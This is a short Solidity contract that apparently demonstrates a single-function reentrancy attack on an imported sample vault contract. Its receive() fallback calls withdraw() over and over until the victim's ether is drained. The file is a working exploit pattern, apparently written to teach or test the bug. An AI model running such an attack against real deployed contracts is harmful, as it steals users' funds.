// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vault.sol";

contract attack_single_function_reentrancy {
    single_function_reentrancy victim;
    uint256 amount = 1 ether ;

    constructor(single_function_reentrancy _victim) payable {
        victim = single_function_reentrancy(_victim);
    }

    /**
     * @notice trigger withdraw
     */
    function attack() public {
        victim.deposit{value: address(this).balance}();
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }

    /**
     * @notice withdraw call call repeatly but they did not update value = balance[msg.sender].
     * so this function obtain value of ether repeatly.
     */
    receive() external payable {
        if (address(victim).balance >= amount) {
            victim.withdraw();
        }
    }
}